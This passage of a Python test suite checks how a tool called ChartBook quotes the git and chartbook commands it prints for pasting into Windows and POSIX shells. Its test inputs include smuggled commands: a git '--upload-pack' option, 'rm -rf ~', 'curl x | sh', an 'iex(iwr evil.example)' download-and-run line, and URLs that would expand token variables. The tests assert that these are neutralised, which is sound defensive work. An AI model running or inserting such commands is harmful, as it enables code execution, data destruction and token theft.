        (report / lock.LOCK_FILE).write_text(json.dumps(document), encoding="utf-8", newline="\n")
        _away(work, "mid")
        return report

    @pytest.mark.parametrize("written", [
        "--upload-pack=touch PASTED;:report",  # an option to git, and a command for it to run
        "https://example.org/acme/x; rm -rf ~ \x1b[2J",
        "ext::sh -c 'touch PASTED'",
        "ssh://git@example.org/acme/mid",
        "/srv/repositories/mid",
    ])
    def test_an_address_is_one_only_if_it_is_a_plain_web_address(self, work, theirs, mine, monkeypatch, written):
        """Found by review: an address that ChartBook's own fetch refused was printed in a `git clone` to paste, which ran a command."""
        def change(entry):
            entry["location"]["repository"] = written

        self._with(work, theirs, change)
        mine()
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        result = _run(work, monkeypatch, "run")
        assert "git clone" not in result.output and "\x1b" not in result.output and "PASTED" not in result.output
        assert _numbered(result)[0].endswith("    its repository is not recorded, so neither is what it reads in turn")

    def test_an_address_is_shown_without_what_signs_in(self, work, theirs, mine, monkeypatch):
        def change(entry):
            entry["location"]["repository"] = "https://ana:s3cret@example.org/acme/mid"

        self._with(work, theirs, change)
        mine()
        result = _run(work, monkeypatch, "run")
        assert "s3cret" not in result.output and "ana" not in result.output
        assert f"     git clone https://example.org/acme/mid {_q(work / 'mid')}" in _said(result)

    @pytest.mark.parametrize("written", [
        "acme/mid" + " " * 120 + "Error: your store is damaged. PASTE-THIS: curl x | sh",
        "acme/mid\x1b[2J PASTE-THIS",
        "acme/mid\nError: PASTE-THIS",
    ])
    def test_a_pipelines_name_is_one_only_if_it_is_an_id(self, work, theirs, mine, monkeypatch, written):
        """Found by review: what a lockfile called the pipeline was shown as it was, and could say anything."""
        def change(entry):
            entry["pinned_from"] = written
            entry["location"]["pipeline"] = written

        self._with(work, theirs, change)
        mine()
        result = _run(work, monkeypatch, "run")
        assert "PASTE-THIS" not in result.output and "\x1b" not in result.output
        assert "cannot be built yet" not in result.output  # the pin says what it has to say of it

    @pytest.mark.skipif(os.name == "nt", reason="a folder cannot be named so on Windows")
    def test_a_folders_name_is_shown_as_text(self, work, theirs, monkeypatch):
        """Found by review: the `cd` line gave a folder's name as it is, control characters and all.

        Asked of the lines themselves: what a command prints to something that is no terminal has its colours taken out on the way.
        """
        odd = work / "o\x1b[31mdd"
        odd.mkdir()
        _write(odd, _table("odd"))
        _repository(odd, "odd")
        report = _pipeline(work, "report", {"acme/odd": {"path": "../o\x1b[31mdd"}})
        said = missing.said(missing.find(report, theirs), here=report)
        assert "1. acme/odd    ../o[31mdd (a folder on this machine)" in said and not any("\x1b" in line for line in said)

    def test_a_space_of_another_kind_in_a_name_is_kept(self):
        """Found by the second pass: a project under `my work`, written with a no-break space, had it dropped from every command."""
        assert "my\u00a0work" in missing._quoted(Path("/home/ana/my\u00a0work/mid"))
        assert missing._plain("a\u200bb\x1b[2Jc\u2028d") == "ab[2Jcd"

    @pytest.mark.parametrize("word, typed", [
        ("C:\\work\\rates", '"C:\\work\\rates"'),
        ("C:\\my work\\rates", '"C:\\my work\\rates"'),
        ("C:\\", '"C:\\\\"'),
        ("D:\\work\\", '"D:\\work\\\\"'),
        ("C:/work/rates", "C:/work/rates"),
        ("https://example.org/acme/rates", "https://example.org/acme/rates"),
        ("rates-2_a.b", "rates-2_a.b"),
        ("https://example.org/acme/x&calc.exe", missing.NOT_TEXT),  # behind PowerShell a batch file reads its `&`
        ("C:\\work\\R&D team\\x", '"C:\\work\\R&D team\\x"'),  # a word with a space keeps its quotes
        ("https://dev.azure.com/org/My%20Project/_git/rates", '"https://dev.azure.com/org/My%20Project/_git/rates"'),
        ("C:\\it's (old) & co\\rates", '"C:\\it\'s (old) & co\\rates"'),
    ])
    def test_for_cmd_a_word_with_anything_it_reads_is_in_double_quotes(self, word, typed):
        """Found by the second pass (not run on Windows): `&` ends a command there, and the address that held one was printed bare.

        And by the third: a `%` was doubled, which is right in a batch file and wrong at a prompt, where these are pasted.

        And by typing the lines on Windows, 2026-11-20: a path was printed bare, which cmd.exe and PowerShell
        read and Git Bash does not (`C:\\work\\rates` reached the command as `C:workrates`). In double quotes all
        three read it.
        """
        assert missing._quoted(word, windows=True) == typed

    def test_a_command_a_message_prints_is_typed_for_this_systems_shells(self):
        """Found on Windows, 2026-11-20: `shlex.join` put a folder there in single quotes, and cmd.exe read `'C:\\work\\rates'`, quotes and all, as the folder's name."""
        words = ["chartbook", "pin", "--update", "rates", "a b", "--project-dir", "C:\\my work\\report"]
        assert missing.typed(words, windows=True) == 'chartbook pin --update rates "a b" --project-dir "C:\\my work\\report"'
        assert missing.typed(["chartbook", "restore", "--project-dir", "C:\\work\\up"], windows=True) == 'chartbook restore --project-dir "C:\\work\\up"'
        # In a POSIX shell, as shlex has it
        for posix in (words, ["chartbook", "pin", "--project-dir", "/work/it's"], ["chartbook", "pin", ""]):
            assert missing.typed(posix, windows=False) == shlex.join(posix)

    def test_a_folder_a_message_tells_to_type_is_written_by_the_one_function(self):
        """Found by the second pass: two messages wrote a folder after `--project-dir` their own way (a Python repr; double quotes of their own, and bare on Windows)."""
        source = Path(missing.__file__).parent
        told = r"(?:--project-dir|safe\.directory|migrate_toml_v2\.py|chartbook path|net use Q:|chartbook link \{[^{}]*\}) \{([^{}]*)\}"
        written = [
            (file.name, found[1]) for file in sorted(source.rglob("*.py"))
            for found in re.finditer(told, file.read_text(encoding="utf-8"))
        ]
        # And by the third pass: `chartbook link ID FOLDER`, of a manifest's `path`, and three of the user's own words
        assert len(written) >= 11 and {"resolve.py", "scaffold.py", "lock.py", "run.py", "cli.py", "missing.py", "manifest.py"} <= {name for name, _ in written}
        assert [(name, how) for name, how in written if "_quoted(" not in how] == []

    def test_no_other_code_quotes_a_command_for_a_posix_shell_alone(self):
        """One function quotes what is printed to be pasted. `shlex` is for a POSIX shell, and a message is read on Windows too.

        (But in `scaffold.py`, whose `cruft link` line holds JSON, which no one spelling gives to cmd.exe and PowerShell alike.)
        """
        source = Path(missing.__file__).parent
        found = sorted(
            file.name for file in source.rglob("*.py")
            if file.name not in ("missing.py", "scaffold.py") and re.search(r"shlex\.(quote|join)", file.read_text(encoding="utf-8"))
        )
        assert found == []

    def test_a_command_names_its_folder_and_enters_none(self):
        """Found on Windows, 2026-11-20: the lines were `cd /d FOLDER && …`, for cmd.exe. Windows PowerShell, which a new machine opens, reads neither `&&` nor `cd /d`.

        (And before that, by the third pass: a bare `cd` does not change the drive there. A command that names its folder has no drive to change.)
        """
        assert missing._in("D:\\class\\my rates", windows=True) == ' --project-dir "D:\\class\\my rates"'
        assert missing._in("D:\\class\\rates", windows=True) == ' --project-dir "D:\\class\\rates"'
        assert missing._in("/work/my rates", windows=False) == " --project-dir '/work/my rates'"
        assert not hasattr(missing, "_cd")

    def test_a_folder_with_a_space_in_its_name_is_one_word_of_the_command(self, work, theirs, monkeypatch):
        spaced = work / "my rates"
        spaced.mkdir()
        _write(spaced, _table("rates"))
        _repository(spaced, "rates")
        _pipeline(work, "report", {"acme/rates": {"path": "../my rates"}})
        result = _run(work, monkeypatch, "run")
        assert f"     chartbook run --snapshot --project-dir {_q(spaced)}" in _said(result) and _q(spaced) != str(spaced)
        done = _follow(work, result, monkeypatch)
        assert "Ran build in 1 pipeline(s)." in done.stdout

    @pytest.mark.parametrize("within", ["", "pipelines/rates"])
    def test_a_clone_named_in_another_letter_case_than_its_address_is_named_as_the_disk_names_it(self, work, theirs, mine, monkeypatch, within):
        """A clone is looked for under the name its address gives, and a disk that takes either letter case finds `RATES` for `rates`.

        Found by review: under the address's name, where the pipeline is
        in its repository could not be told. The list had pathlib's words
        in it (`'…/rates' is not in the subpath of '…/RATES'`), a checkout
        of the commit the clone was on already, and nothing of what the
        pipeline reads in turn; and the command it gave named a folder its
        snapshot would have been refused for.
        """
        top = work / "RATES"
        directory = top / within if within else top
        directory.mkdir(parents=True)
        if not (work / "rates").is_dir():
            pytest.skip("this disk tells letter cases apart")
        base = _ready(_pipeline(work, "base"), theirs)
        _write(directory, _table("rates", {"acme/base": {}}))
        _repository(top, "rates")
        commit = _ready(directory, theirs, rows="rates,1")  # as its build writes them
        _ready(_pipeline(work, "report", {"acme/rates": {}}), theirs)
        _away(work, "base")
        store = mine()
        result = _run(work, monkeypatch, "run")
        shown = os.path.relpath(directory, work / "report")
        assert _said(result)[-10:-4] == [
            f"1. acme/base at {base[:7]}    https://example.org/acme/base",
            f"     git clone https://example.org/acme/base {_q(work / 'base')}",
            f"     git -C {_q(work / 'base')} checkout {base[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'base')}",
            f"2. acme/rates at {commit[:7]}    {shown} (a clone of https://example.org/acme/rates); reads 1 above",
            f"     chartbook run --snapshot --project-dir {_q(directory)}",  # as the disk names it, and on that commit already
        ]
        done = _follow(work, result, monkeypatch)
        assert "Ran build in 1 pipeline(s)." in done.stdout
        (taken,) = [one for one in snapshot.all_snapshots(store) if one.pipeline == "acme/rates"]
        assert taken.subdirectory == within

    def test_a_clone_told_by_its_id_is_named_as_the_disk_names_it_too(self, work, theirs, monkeypatch):
        """Nothing records its address: the clone beside is told by its `origin`, and looked for under the last part of the ID."""
        top = work / "RATES"
        top.mkdir()
        if not (work / "rates").is_dir():
            pytest.skip("this disk tells letter cases apart")
        _write(top, _table("rates"))
        _repository(top, "rates")
        _pipeline(work, "report", {"acme/rates": {}})
        said = _said(_run(work, monkeypatch, "run"))
        assert f"1. acme/rates    {_up('RATES')} (a clone of https://example.org/acme/rates)" in said
        assert f"     chartbook run --snapshot --project-dir {_q(top)}" in said

    def test_a_folder_is_named_as_the_folder_it_is_in_lists_it(self, work):
        (work / "Rates").mkdir()
        assert missing._named_by_the_disk(work / "Rates") == work / "Rates"
        assert missing._named_by_the_disk(work / "none") == work / "none"
        assert missing._named_by_the_disk(work / "no such folder" / "rates") == work / "no such folder" / "rates"
        if (work / "rates").is_dir():  # a disk that takes either letter case
            assert missing._named_by_the_disk(work / "rates") == work / "Rates"

    def test_for_windows_every_sign_a_shell_reads_puts_a_word_in_double_quotes(self):
        """Found by review: four signs were held by a test, and a rule that left any other bare passed them all."""
        bare = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_./:-")
        read = set('$`"!%&|<>^')  # even inside them, or in a word that loses them: such a word is not written at all
        for sign in map(chr, range(0x20, 0x7F)):
            word = f"a{sign}b"
            typed = word if sign in bare else missing.NOT_TEXT if sign in read else f'"{word}"'
            assert missing._quoted(word, windows=True) == typed, sign


class TestWhatAShellOnWindowsReadsInQuotes:
    """Found by review: on Windows a word is in double quotes, and PowerShell, Git Bash and cmd.exe each read something inside them.

    An address in a lockfile is anyone's, and so is a folder's name in a
    repository that was cloned: `git clone "https://…/$env:TOKEN"` sends
    the token where the address says, and a folder named `$(…)` is a
    command. No spelling keeps those as text in all three shells, so
    such a line is given no command.
    """

    COMMIT = "c" * 40

    @pytest.mark.parametrize("words, said", [
        (["https://example.org/acme/$env:GITHUB_TOKEN"], "a `$`"),
        (["C:\\work\\$(calc)\\mid"], "a `$`"),
        (["C:\\work\\a`b"], "a backtick"),
        (["C:\\work\\!rm"], "a `!`"),
        (["https://example.org/acme/%GITHUB_TOKEN%"], "`%GITHUB_TOKEN%`"),
        (["https://example.org/acme/%github_token:~0,4%"], "`%github_token%`"),
        (["https://example.org/acme/%CD%2Frates"], "`%CD%`"),  # cmd.exe's own, set or not
        (["https://example.org/acme/%20%GITHUB_TOKEN%"], "`%GITHUB_TOKEN%`"),  # the `%` that ended no name begins one
        (["C:\\work\\rates", "https://example.org/acme/%GITHUB_TOKEN%"], "`%GITHUB_TOKEN%`"),
        (["https://example.org/acme/%PATH%"], "`%PATH%`"),  # a variable is one whatever case its name was set in
        (["https://example.org/acme/My%20Big%20Project"], ""),  # `20Big` is no variable
        (["https://example.org/acme/%C3%A9t%C3%A9"], ""),
        (["C:\\work\\my rates (old) & co; it's #1 @home ^ {x} [y] = ~a, b+c", "https://example.org/acme/rates"], ""),
        # Found by the second pass of the review, each of them:
        (["https://example.org/acme/%OTHER_TOKEN%"], "a `%`"),  # no variable here, and it may be one where the line is pasted
        (["https://example.org/acme/%=C:%"], "a `%`"),  # cmd.exe's own name for where it is on a drive
        (["https://example.org/acme/%__CD__%"], "`%__CD__%`"),
        (["https://example.org/acme/100%"], "a `%`"),
        (["C:\\work\\mid\\pipes\\\";calc;#"], 'a `"`'),  # Git Bash: `\\"` is a quote that is text, and the next ends the word
        (["C:\\work\\mid\\x\u201d;iex(iwr evil.example);#"], "a `\u201d`"),  # PowerShell: a quote, as the plain one is
        (["C:\\work\\\u201cx"], "a `\u201c`"),
        (["C:\\work\\\u201ex"], "a `\u201e`"),
        (["C:\\work\\%USER\u200bNAME%\\mid"], "`%USERNAME%`"),  # read as it is printed: without what prints as nothing
        (["\\\\server\\home$\\ab123\\work\\mid"], ""),  # a share that is not listed: a `$` before a slash is text
        (["\\\\server\\c$"], ""),
        (["//server/home$/work"], ""),
        (["C:\\work\\a$ b"], "a `$`"),
        # Found by the third pass:
        (["C:\\work\\$\\x"], "a `$`"),  # Git Bash takes a backslash and a `$` for a `$` that is text: another folder
        (["C:\\work\\x\\$"], "a `$`"),
        (["C:\\work\\R&D\\report"], "a `&`"),  # with no space, PowerShell hands it on without its quotes
        (["C:\\work\\x^y"], "a `^`"),
        (["a|b"], "a `|`"), (["a<b"], "a `<`"), (["a>b"], "a `>`"),
        (["C:\\work\\R&D team\\x^y"], ""),
        (["C:\\work\\R&D\u00a0team"], "a `&`"),  # a space of another kind is not known to keep the quotes
        ([Path("C:\\work\\$x")], "a `$`"),
    ])
    def test_what_is_read(self, words, said):
        assert missing._a_windows_shell_reads(words, environment=["Path", "GITHUB_TOKEN", "UserName"]) == said

    @pytest.mark.parametrize("word, read, in_a_batch_file", [
        # Git's own word for a network share, and the one git printed on the machine these were typed on
        ("%(prefix)///fileserver/home/ab123/work/mid", "", "a `%`"),
        ("%(prefix)///localhost/c$/cbtest/work2/rates", "", "a `%`"),
        ("%(prefix)///fileserver/home/ab 123/work/mid", "", "a `%`"),
        ("//fileserver/home/R&D/rates", "", "a `&`"),  # only a batch file's cmd.exe reads it
        ("%(prefix)///fileserver/%USERNAME%/mid", "`%USERNAME%`", "`%USERNAME%`"),  # cmd.exe fills it in: typed there too
        ("%(prefix)///fileserver/home/100% done/mid", "a `%`", "a `%`"),  # two of them may hold a name where it is pasted
        ("%(prefix)///fileserver/$(calc)/mid", "a `$`", "a `$`"),
        ("%(prefix)///fileserver/a`b/mid", "a backtick", "a backtick"),
    ])
    def test_a_word_for_a_program_and_not_a_batch_file(self, word, read, in_a_batch_file):
        """Found by the review of what prints git's `safe.directory` command: git begins a share's folder
        with `%(prefix)/`, the word was withheld for its `%`, and the command named no folder.

        Typed on Windows 11, 2026-11-20, in cmd.exe, Windows PowerShell 5.1 and Git Bash: in double
        quotes, the word reaches a program as it is, and the command makes git trust the folder; a
        `%NAME%` in it is filled in by cmd.exe. `git` is a program wherever it is installed.
        `chartbook` may be a batch file (pyenv's), and through one that uses `call` the `%` was
        dropped in all three shells (`C:\\work\\100%\\mid` arrived as `C:\\work\\100\\mid`): for its
        words nothing changes."""
        assert missing._a_windows_shell_reads([word], environment=["USERNAME"], batch=False) == read
        assert missing._a_windows_shell_reads([word], environment=["USERNAME"]) == in_a_batch_file

    @pytest.mark.parametrize("word, typed", [
        ("\\\\localhost\\c$\\cbtest\\said\\bash\\e\\rates", '"//localhost/c$/cbtest/said/bash/e/rates"'),  # the one that was typed
        ("\\\\fileserver\\home\\ab123\\my work\\mid", '"//fileserver/home/ab123/my work/mid"'),
        ("\\\\fileserver\\share", '"//fileserver/share"'),  # in quotes always: only that was typed
        ("\\\\fileserver\\share\\", '"//fileserver/share/"'),  # and no backslash is left to come before the quote
        ("\\\\?\\C:\\work\\rates", '"\\\\?\\C:\\work\\rates"'),  # a device's path is read as it is written
        ("\\\\.\\C:\\work\\rates", '"\\\\.\\C:\\work\\rates"'),
        ("C:\\work\\rates", '"C:\\work\\rates"'),  # a folder on a drive is as it was
        ("\\work\\rates", '"\\work\\rates"'),  # one backslash: of the drive one is on, and no share
    ])
    def test_a_network_path_is_written_as_all_three_shells_take_it(self, word, typed):
        """Found on Windows by typing the list's lines in Git Bash: it reads the two backslashes a network
        path begins with as one, in double quotes too, so `git -C "\\\\localhost\\c$\\…"` could not change to
        `\\localhost\\c$\\…`, and `chartbook run --project-dir` looked on drive C. Typed there with forward
        slashes, in cmd.exe, Windows PowerShell 5.1 and Git Bash, the folder is the same one to git and to
        ChartBook."""
        assert missing._quoted(word, windows=True) == typed
        assert missing._in(word, windows=True) == f" --project-dir {typed}"
        assert missing.typed(["git", "-C", word, "checkout", "abc"], windows=True) == f"git -C {typed} checkout abc"

    @pytest.mark.parametrize("folder, written", [
        ("\\\\fileserver\\share\\$\\rates", '"//fileserver/share/$/rates"'),
        ("\\\\fileserver\\share\\$", '"//fileserver/share/$"'),
    ])
    def test_what_a_shell_reads_is_asked_of_the_word_as_it_is_written(self, work, folder, written):
        """Found by the review: a share's folder named `$` was written by the one function (a `$` before a
        slash, or at the end, is text) and given no command by the list, which asked of the word with its
        backslashes, where Git Bash takes a backslash and a `$` for one sign."""
        assert missing._quoted(folder, windows=True) == written
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/mid", None, folder=Path(folder)),
        ])
        said = missing.said(listing, here=work / "report", windows=True)
        assert f"     chartbook run --snapshot --project-dir {written}" in said, said
        # And a drive's folder of that name is given none, as before
        assert missing._quoted("C:\\work\\$\\rates", windows=True) == missing.NOT_TEXT
        # The last line is read the same way: the pipeline's own folder, there
        own = missing.Listing("acme/report", Path(folder), stores=[str(work / "mine")], wanted=[missing.Wanted("acme/mid", None, folder=work / "mid")])
        assert missing.said(own, here=work, windows=True)[-2] == f"     chartbook run --project-dir {written}"

    def test_net_use_is_given_a_network_path_as_windows_writes_it(self):
        word = "\\\\fileserver\\my share"
        assert missing._quoted(word, windows=True, backslashes=True) == f'"{word}"'
        assert missing._quoted("\\\\fileserver\\share", windows=True, backslashes=True) == '"\\\\fileserver\\share"'

    def test_elsewhere_a_word_that_begins_with_two_backslashes_is_no_network_path(self):
        word = "\\\\fileserver\\share"
        assert missing._quoted(word, windows=False) == shlex.quote(word)

    def test_a_shares_word_is_quoted_whole_for_git_and_withheld_for_what_may_be_a_batch_file(self):
        word = "%(prefix)///fileserver/home/ab123/work/mid"
        assert missing._quoted(word, windows=True, batch=False) == f'"{word}"'
        assert missing._quoted(word, windows=True) == missing.NOT_TEXT
        assert missing._quoted(word, windows=False, batch=False) == missing._quoted(word, windows=False) == shlex.quote(word)

    def test_the_variables_are_this_machines(self, monkeypatch):
        """A name that begins and is followed as a web address writes a sign (`%AB…%20`) is a variable only if this machine has it."""
        word = "https://example.org/acme/%AB_TEST_SECRET%20x"
        monkeypatch.setenv("AB_TEST_SECRET", "x")
        assert missing._a_windows_shell_reads([word]) == "`%AB_TEST_SECRET%`"
        assert missing._a_windows_shell_reads([word.lower()]) == "`%ab_test_secret%`"
        monkeypatch.delenv("AB_TEST_SECRET")
        assert missing._a_windows_shell_reads([word]) == ""
        # Any other name is taken for one, set here or not: it may be set where the line is pasted
        assert missing._a_windows_shell_reads(["https://example.org/acme/%CB_TEST_NONE%"]) == "a `%`"

    def test_no_command_any_message_prints_holds_one(self):
        """The one function writes every folder and every word of the user's that a message tells to type. On Windows it never writes one a shell would read."""
        read = ["C:\\work\\$(calc)", "C:\\work\\x\u201d;calc;#", "C:\\work\\a`b", "C:\\work\\!rm", 'C:\\work\\a";calc;#', "https://example.org/%CD%2F"]
        for word in read:
            assert missing._quoted(word, windows=True) == missing.NOT_TEXT == "ITS-NAME-HOLDS-A-SIGN-A-SHELL-READS"
            assert missing._in(word, windows=True) == f" --project-dir {missing.NOT_TEXT}"
            assert missing.typed(["chartbook", "restore", "--project-dir", word], windows=True) == f"chartbook restore --project-dir {missing.NOT_TEXT}"
            # In a POSIX shell single quotes make it text, and it is given
            assert missing._quoted(word, windows=False) == shlex.quote(word)
        assert not missing._a_windows_shell_reads([missing.NOT_TEXT])

    def _said(self, work: Path, line: missing.Wanted, windows: bool) -> list[str]:
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[line])
        said = missing.said(listing, here=work / "report", windows=windows)
        return said[3:said.index("", 4)]

    def test_a_line_with_one_is_given_no_command_on_windows(self, work):
        line = missing.Wanted("acme/mid", self.COMMIT, "https://example.org/acme/$env:GITHUB_TOKEN")
        assert self._said(work, line, windows=True) == [
            "1. acme/mid at ccccccc    https://example.org/acme/$env:GITHUB_TOKEN",
            "     No command is given for it: one would hold a `$`, which a shell on Windows reads even inside quotes.",
            f"     By hand: `chartbook run --snapshot` in its folder, at {self.COMMIT[:12]}.",
        ]
        # Never pinned, and with no build script: what is to be typed by hand is the snapshot alone
        folder = missing.Wanted("acme/mid", None, folder=work / "a`b", builds=False)
        assert self._said(work, folder, windows=True)[1:] == [
            "     No command is given for it: one would hold a backtick, which a shell on Windows reads even inside quotes.",
            "     By hand: `chartbook snapshot` in its folder.",
        ]

    def test_what_is_said_by_hand_names_no_checkout(self, work):
        """Found by the second pass: "`git checkout …` in its folder" moved the reader's own repository, where the line was of a folder of it. What to make is said, and not how."""
        line = missing.Wanted("acme/mid", self.COMMIT, folder=work / "report" / "!mid", top=work / "report")
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[line], top=work / "report")
        said = missing.said(listing, here=work / "report", windows=True)
        assert said[4:6] == [
            "     No command is given for it: one would hold a `!`, which a shell on Windows reads even inside quotes.",
            f"     By hand: `chartbook run --snapshot` in its folder, at {self.COMMIT[:12]}.",
        ]
        assert not any("git " in text for text in said)

    def test_a_line_with_no_command_leaves_the_next_its_own(self, work):
        """Found by the second pass: the second pipeline of a repository began at `git checkout`, in a clone the line above was to have made and did not."""
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/a", self.COMMIT, "https://example.org/acme/mono", subdirectory="$a", placed=True),
            missing.Wanted("acme/b", self.COMMIT, "https://example.org/acme/mono", subdirectory="b", placed=True),
        ])
        said = missing.said(listing, here=work / "report", windows=True)
        assert said[4].startswith("     No command is given for it: one would hold a `$`")
        mono = missing._quoted(work / "mono", windows=True)
        assert said[6:10] == [
            "2. acme/b at ccccccc    https://example.org/acme/mono",
            f"     git clone https://example.org/acme/mono {mono}",
            f"     git -C {mono} checkout {self.COMMIT[:12]}",
            f"     chartbook run --snapshot --project-dir {missing._quoted(work / 'mono' / 'b', windows=True)}",
        ]

    def test_a_repository_a_line_with_no_command_would_have_moved_is_still_taken_for_moved(self, work):
        """Found by the third pass: by hand it may well be moved, and the folder beside it, "built already", was then given `chartbook snapshot` for files of the commit it had been on."""
        top = work / "multi"
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/b", self.COMMIT, folder=top / "b!", top=top),
            missing.Wanted("acme/c", None, folder=top / "c", top=top, built=True, read_at="d" * 40),
        ])
        windows = missing.said(listing, here=work / "report", windows=True)
        assert windows[4].startswith("     No command is given for it: one would hold a `!`")
        assert windows[6:9] == [
            f"2. acme/c    {os.path.join('..', 'multi', 'c')} (a folder on this machine)",
            f"     git -C {missing._quoted(top, windows=True)} checkout {'d' * 12}",
            f"     chartbook run --snapshot --project-dir {missing._quoted(top / 'c', windows=True)}",
        ]
        # As the POSIX list has it, where the line above is given its commands
        assert missing.said(listing, here=work / "report", windows=False)[6:9] == [
            f"2. acme/c    {os.path.join('..', 'multi', 'c')} (a folder on this machine)",
            f"     git -C {shlex.quote(str(top))} checkout {'d' * 12}",
            f"     chartbook run --snapshot --project-dir {shlex.quote(str(top / 'c'))}",
        ]

    def test_the_last_line_is_read_too(self, work):
        """Found by the second pass: the pipeline's own folder may be one of somebody's repository, and "by hand, in its folder" leads to a list whose last line names it."""
        own = work / "mid" / "$(touch PWNED)"
        listing = missing.Listing("acme/odd", own, stores=[str(work / "mine")], wanted=[missing.Wanted("acme/mid", None, folder=work / "mid")])
        said = missing.said(listing, again="chartbook run --snapshot", here=own, windows=True)
        assert said[-3:-1] == [
            "Then here again:",
            "     In this pipeline's folder, which no command can name (it holds a `$`): `chartbook run --snapshot`",
        ]
        assert not any("touch PWNED" in text for text in said if text.startswith("     "))
        # In a POSIX shell it is text in single quotes, and the command names it
        posix = missing.said(listing, again="chartbook run --snapshot", here=own, windows=False)
        assert posix[-2] == f"     chartbook run --snapshot --project-dir {shlex.quote(str(own))}"

    def test_in_a_posix_shell_it_is_text_in_single_quotes_and_the_command_is_given(self, work):
        line = missing.Wanted("acme/mid", self.COMMIT, "https://example.org/acme/$env:GITHUB_TOKEN")
        assert self._said(work, line, windows=False)[1:] == [
            f"     git clone 'https://example.org/acme/$env:GITHUB_TOKEN' {shlex.quote(str(work / 'GITHUB_TOKEN'))}",
            f"     git -C {shlex.quote(str(work / 'GITHUB_TOKEN'))} checkout {self.COMMIT[:12]}",
            f"     chartbook run --snapshot --project-dir {shlex.quote(str(work / 'GITHUB_TOKEN'))}",
        ]

    def test_the_line_after_one_has_its_commands(self, work):
        """What a line holds is its own: a line is not left without commands for a word of the line above."""
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/odd", None, folder=Path("C:\\work\\$odd")),
            missing.Wanted("acme/mid", None, folder=Path("C:\\work\\mid")),
        ])
        said = missing.said(listing, here=work / "report", windows=True)
        assert said[4].startswith("     No command is given for it: one would hold a `$`")
        assert said[6:8] == ["2. acme/mid    C:\\work\\mid (a folder on this machine)", '     chartbook run --snapshot --project-dir "C:\\work\\mid"']

    def test_a_line_with_none_has_its_commands_and_every_folder_in_double_quotes(self, work):
        """The whole of a line as Windows is given it: a path there has a backslash, which is in double quotes for Git Bash."""
        line = missing.Wanted("acme/mid", self.COMMIT, folder=Path("C:\\work\\my rates"))
        listing = missing.Listing("acme/report", Path("C:\\work\\report"), stores=["C:\\store"], wanted=[line])
        said = missing.said(listing, here=Path("C:\\work\\report"), windows=True)
        assert said[4:6] == [
            f'     git -C "C:\\work\\my rates" checkout {self.COMMIT[:12]}',
            '     chartbook run --snapshot --project-dir "C:\\work\\my rates"',
        ]
        assert said[-3:-1] == ["Then here again:", '     chartbook run --project-dir "C:\\work\\report"']


class TestEachKindOfLine:
    """The commands of each kind of line, of a list made by hand: one command to a line, and the folder each names."""

    COMMIT = "c" * 40

    @staticmethod
    def _commands(work: Path, line: missing.Wanted) -> list[str]:
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[line])
        said = missing.said(listing, here=work / "report")
        assert said[3].startswith("1. acme/mid")
        assert said[-3:-1] == ["Then here again:", f"     chartbook run --project-dir {_q(work / 'report')}"]
        return said[4:said.index("", 4)]

    def test_a_clone_that_was_never_pinned_is_built_in_the_folder_it_has_the_pipeline_in(self, work):
        line = missing.Wanted("acme/mid", None, "https://example.org/acme/mid", clone=work / "mid", subdirectory="pipelines/mid", placed=True)
        assert self._commands(work, line) == [f"     chartbook run --snapshot --project-dir {_q(work / 'mid' / 'pipelines' / 'mid')}"]

    def test_a_clone_that_lacks_its_commit_is_fetched_checked_out_and_built_in_that_order(self, work):
        line = missing.Wanted(
            "acme/mid", self.COMMIT, "https://example.org/acme/mid", clone=work / "mid", subdirectory="pipelines/mid", placed=True,
            lacks=True, shallow=True,
        )
        assert self._commands(work, line) == [
            f"     git -C {_q(work / 'mid')} fetch --unshallow",
            f"     git -C {_q(work / 'mid')} checkout {self.COMMIT[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid' / 'pipelines' / 'mid')}",
        ]

    def test_a_repository_to_clone_that_was_never_pinned_is_built_in_its_folder_there(self, work):
        line = missing.Wanted("acme/mid", None, "https://example.org/acme/mid", subdirectory="pipelines/mid", placed=True)
        assert self._commands(work, line) == [
            f"     git clone https://example.org/acme/mid {_q(work / 'mid')}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid' / 'pipelines' / 'mid')}",
        ]

    def test_a_folder_whose_repository_is_not_known_is_checked_out_where_it_is(self, work):
        line = missing.Wanted("acme/mid", self.COMMIT, folder=work / "mid")
        assert self._commands(work, line) == [
            f"     git -C {_q(work / 'mid')} checkout {self.COMMIT[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
        ]

    def test_one_with_no_build_script_is_given_the_snapshot_alone(self, work):
        line = missing.Wanted("acme/mid", self.COMMIT, folder=work / "mid", top=work / "mid", builds=False)
        assert self._commands(work, line) == [
            f"     git -C {_q(work / 'mid')} checkout {self.COMMIT[:12]}",
            f"     chartbook snapshot --project-dir {_q(work / 'mid')}",
        ]

    def test_one_whose_repository_is_not_recorded_is_said_in_words(self, work):
        """No folder to name: the two commands are in a sentence, and joined by no sign a shell reads."""
        assert self._commands(work, missing.Wanted("acme/mid", self.COMMIT)) == [
            f"     In a clone of it: `git checkout {self.COMMIT[:12]}`, then `chartbook run --snapshot`"
        ]
        assert self._commands(work, missing.Wanted("acme/mid", None)) == ["     In a clone of it: `chartbook run --snapshot`"]


class TestARepositoryThatDoesNotHoldIt:
    """Found by the second pass: a repository with one manifest was taken to hold whatever pipeline was asked of it."""

    def test_an_entry_that_names_another_pipelines_repository_is_said_by_its_pin(self, work, theirs, monkeypatch):
        """The list said to build acme/beta in the repository of rates, which built rates, and said so again for ever."""
        _ready(_pipeline(work, "rates"), theirs)
        _pipeline(work, "report", {"acme/beta": {"repository": "https://example.org/acme/rates"}})
        _away(work, "rates")
        result = _run(work, monkeypatch, "run")
